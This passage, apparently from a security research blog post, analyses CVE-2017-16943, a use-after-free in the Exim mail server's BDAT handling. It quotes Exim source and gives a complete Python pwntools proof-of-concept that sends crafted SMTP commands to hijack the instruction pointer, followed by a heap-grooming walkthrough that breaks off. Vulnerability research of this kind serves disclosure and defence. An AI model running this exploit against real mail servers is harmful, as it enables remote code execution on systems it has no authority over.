&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ptr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounded_oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;next_yield&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;inc&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield_length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;store_pool&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounded_oldsize&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldsize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Once &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_extend&lt;/code&gt; fails, exim tries to get a new store and release the old one. After we look into  &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; and store_release, we found that &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; returns a &lt;strong&gt;store&lt;/strong&gt;, but &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release&lt;/code&gt; releases a &lt;strong&gt;block&lt;/strong&gt; if the store is at the head of it. That is to say, if &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; points to the start the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; cuts store inside it for &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newtext&lt;/code&gt;, then &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_release(next-&amp;gt;text)&lt;/code&gt; frees &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;, which is equal to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;, and leaves &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;newtext&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; pointing to a freed memory area. Any further usage of these pointers leads to a use-after-free vulnerability. To trigger this bug, we need to make exim call &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; after &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; is allocated. This was impossible until BDAT command was introduced into exim. BDAT makes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; reachable and finally leads to an RCE.
Exim uses &lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/globals.h#L136&quot;&gt;function pointers&lt;/a&gt; to switch between different input sources, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getbuf&lt;/code&gt;. When receiving BDAT data, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt; is set to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt; in order to check left chunking data size and to handle following command of BDAT. In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt;, exim also uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_getc&lt;/code&gt;. It loops to read data, and stores data into &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt;, extends if insufficient.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1789&quot;&gt;receive.c: 1817 receive_msg&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(;;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;receive_getc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GETC_BUFFER_UNLIMITED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  
  &lt;span class=&quot;cm&quot;&gt;/* If we hit EOF on a SMTP connection, it&apos;s an error, since incoming
  SMTP must have a correct &quot;.&quot; terminator. */&lt;/span&gt;

  &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ch&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EOF&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smtp_input&lt;/span&gt; &lt;span class=&quot;cm&quot;&gt;/* &amp;amp;&amp;amp; !smtp_batched_input */&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;smtp_reply&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;handle_lost_connection&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot; (header)&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;smtp_yield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;FALSE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;goto&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;TIDYUP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;                       &lt;span class=&quot;cm&quot;&gt;/* Skip to end of function */&lt;/span&gt;
    &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bdat_getc&lt;/code&gt;, once the SIZE is reached, it tries to read the next BDAT command and raises error message if the following command is incorrect. 
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L628&quot;&gt;smtp_in.c: 628 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;k&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;BDAT_CMD&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
      &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
      &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

      &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sscanf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;CS&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;smtp_cmd_data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;%u %n&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunking_datasize&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;n&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;L_smtp_protocol_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;501&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;US&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;missing size for BDAT command&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;ERR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;In exim, it usually calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;synprot_error&lt;/code&gt; to raise error message, which also logs at the same time.
&lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/smtp_in.c#L2984&quot;&gt;smtp_in.c: 628 bdat_getc&lt;/a&gt;&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;
&lt;span class=&quot;nf&quot;&gt;synprot_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;code&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;uschar&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;errmess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;yield&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;log_write&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;LOG_MAIN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;SMTP %s error in &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;%s&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;&lt;span class=&quot;s&quot;&gt; %s %s&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;L_smtp_syntax_error&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;?&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;syntax&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;protocol&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;string_printing&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_cmd_buffer&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;host_and_ident&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;TRUE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;errmess&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;The log messages are printed by string_printing. This function ensures a string is printable. For this reason, it extends the string to transfer characters if any unprintable character exists, such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;\n&apos;-&amp;gt;&apos;\\n&apos;&lt;/code&gt;. Therefore, it asks &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; for memory to store strings.
This store makes &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;if (!store_extend(next-&amp;gt;text, oldsize, header_size))&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;receive_msg&lt;/code&gt; failed when next extension occurs and then triggers use-after-free.&lt;/p&gt;

&lt;h3 id=&quot;exploitation&quot;&gt;Exploitation&lt;/h3&gt;
&lt;p&gt;The following is the Proof-of-Concept(PoC) python script of this vulnerability. This PoC controls the control flow of SMTP server and sets instruction pointer to &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;0xdeadbeef&lt;/code&gt;. For fuzzing issue, we did change the runtime configuration of exim. As a result, this PoC works only when &lt;strong&gt;dkim&lt;/strong&gt; is enabled. We use it as an example because the situation is less complicated. The version with default configuration is also exploitable, and we will discuss it at the end of this section.&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;# CVE-2017-16943 PoC by meh at DEVCORE
# pip install pwntools
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pwn&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;remote&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;127.0.0.1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;25&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;EHLO test&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;250 HELP&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;MAIL FROM:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;RCPT TO:&amp;lt;meh@some.domain&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1250&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;BDAT 1&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sendline&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;:BDAT &lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\x7f&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;a&apos;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0xdeadbeef&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mh&quot;&gt;0x1e00&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;/&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;s&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;:&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\r\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;recvuntil&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;command&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;send&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;interactive&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;ol&gt;
  &lt;li&gt;Running out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;
 In order to achieve code execution, we need to make the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; get the first store of a block. That is, running out of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; and making &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt; allocate a new block. Therefore, we send a long message &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&apos;a&apos;*0x1250+&apos;\x7f&apos;&lt;/code&gt; with an unprintable character to cut &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt;, making &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;yield_length&lt;/code&gt; less than 0x100.
 &lt;img src=&quot;/assets/img/blog/20171211/2.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;Starts BDAT data transfer
 After that, we send BDAT command to start data transfer. At the beginning, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; are allocated by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt;. 
 &lt;img src=&quot;/assets/img/blog/20171211/3.png&quot; alt=&quot;&quot; /&gt;
 The function &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dkim_exim_verify_init&lt;/code&gt; is called sequentially and it also calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_get&lt;/code&gt;. Notice that this function uses &lt;strong&gt;ANOTHER &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;store_pool&lt;/code&gt;&lt;/strong&gt;, so it allocates from heap without changing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;current_block&lt;/code&gt; which &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;next-&amp;gt;text&lt;/code&gt; also points to.
 &lt;a href=&quot;https://github.com/Exim/exim/blob/e924c08b7d031b712013a7a897e2d430b302fe6c/src/src/receive.c#L1734&quot;&gt;receive.c: 1734 receive_msg&lt;/a&gt;
    &lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;smtp_batched_input&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;dkim_disable_verify&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
   &lt;span class=&quot;n&quot;&gt;dkim_exim_verify_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;chunking_state&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;CHUNKING_OFFERED&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
